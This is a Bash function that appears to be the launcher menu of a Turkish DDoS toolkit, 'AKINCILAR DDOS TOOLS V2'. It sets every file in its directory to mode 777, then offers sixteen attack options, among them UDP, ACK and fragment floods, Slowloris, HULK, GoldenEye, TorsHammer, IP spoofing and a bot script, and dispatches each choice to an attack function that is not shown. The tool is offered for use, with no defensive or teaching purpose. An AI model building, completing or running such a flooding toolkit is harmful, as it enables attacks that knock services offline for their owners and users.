Take_input1()
{
clear
chmod 777 *
chmod +x *
while :
do
clear
echo " "
echo -e "${YELLOW}     █████╗ ██╗  ██╗██╗███╗   ██╗ ██████╗██╗██╗      █████╗ ██████╗ "
echo -e "${YELLOW}    ██╔══██╗██║ ██╔╝██║████╗  ██║██╔════╝██║██║     ██╔══██╗██╔══██╗"
echo -e "${YELLOW}    ███████║█████╔╝ ██║██╔██╗ ██║██║     ██║██║     ███████║██████╔╝"
echo -e "${YELLOW}    ██╔══██║██╔═██╗ ██║██║╚██╗██║██║     ██║██║     ██╔══██║██╔══██╗"
echo -e "${YELLOW}    ██║  ██║██║  ██╗██║██║ ╚████║╚██████╗██║███████╗██║  ██║██║  ██║"
echo -e "${YELLOW}    ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝"
echo -e "${YELLOW}                                                                    "
echo -e "${RED}╔╦╗╔╦╗╔═╗╔═╗  ╔╦╗╔═╗╔═╗╦  ╔═╗  ██╗   ██╗██████╗"
echo -e "${WHITE} ║║ ║║║ ║╚═╗   ║ ║ ║║ ║║  ╚═╗  ██║   ██║╚════██╗"
echo -e "${RED}═╩╝═╩╝╚═╝╚═╝   ╩ ╚═╝╚═╝╩═╝╚═╝  ██║   ██║ █████╔╝"
echo -e "${WHITE}                               ╚██╗ ██╔╝██╔═══╝ "
echo -e "${RED}		                ╚████╔╝ ███████╗"
echo -e "${WHITE}                                 ╚═══╝  ╚══════╝"                  
echo -e "${RED}CODED BY YANLIZ KURT  [NO EDIT]"
echo " "
        echo -e "${WHITE}=========================================="
	echo -e "${LIGHTBLUE}[1]${RED}Twiks${LIGHTBLUE}                                 ${WHITE}|"
	echo -e "${LIGHTBLUE}[2]${RED}UDP FLOOD${LIGHTBLUE}                             ${WHITE}|"
	echo -e "${LIGHTBLUE}[3]${RED}HAMMER${LIGHTBLUE}                                ${WHITE}|"
	echo -e "${LIGHTBLUE}[4]${RED}SLOWLORIS${LIGHTBLUE}                             ${WHITE}|"
	echo -e "${LIGHTBLUE}[5]${RED}TURKBOT${LIGHTBLUE}                               ${WHITE}|"
	echo -e "${LIGHTBLUE}[6]${RED}GOLDENEYE${LIGHTBLUE}                             ${WHITE}|"
	echo -e "${LIGHTBLUE}[7]${RED}FLOOD${LIGHTBLUE}                                 ${WHITE}|" 
        echo -e "${LIGHTBLUE}[8]${RED}TORSHAMMER${LIGHTBLUE}                            ${WHITE}|"    
        echo -e "${LIGHTBLUE}[9]${RED}BOTS SCRIPT${LIGHTBLUE}                          ${WHITE}|"
        echo -e "${LIGHTBLUE}[10]${RED}IP SPOOF${LIGHTBLUE}                             ${WHITE}|"
        echo -e "${LIGHTBLUE}[11]${RED}HULK${LIGHTBLUE}                                 ${WHITE}|"
        echo -e "${LIGHTBLUE}[12]${RED}PROXY SALDIRISI [IP]${LIGHTBLUE}                 ${WHITE}| "      
        echo -e "${LIGHTBLUE}[13]${RED}SLOWLORIS PL${LIGHTBLUE}                         ${WHITE}| "  
        echo -e "${LIGHTBLUE}[14]${RED}RAND${LIGHTBLUE}                                 ${WHITE}|"           
        echo -e "${LIGHTBLUE}[15]${RED}ACK${LIGHTBLUE}                                  ${WHITE}|"           
        echo -e "${LIGHTBLUE}[16]${RED}FRAG${LIGHTBLUE}                                 ${WHITE}|"          
        echo -e "${WHITE}==========================================${LIGHTGREEN}"
    echo -n "Menuden Scriptleri Secebilirsiniz [1 - 16] "
    read yourch
    case $yourch in
      1) Twiks ;;
      2) udp_flood ;;
      3) hammer ;;
	  4) slowloris ;;
         5) TURKBOT ;;
		 7) nytro ;;
	      6) goldeneye ;;
          8) torshammer ;;
          9) bots ;;
	  10) ipspoof ;;
          11) hulk ;;
          12) snmp ;;
	  13) slowloris2 ;;
   	  14) rand ;;
          15) ack ;;
	  16) frag ;;
      ex) echo "As you Command" ;  exit 1  ;;
      *) echo "HATALI RAKAM GIRDINIZ" ;
         echo "Enter Basarak Menuye Dönebilirsiniz . . ." ; read ;;
 esac
done # end_while
}
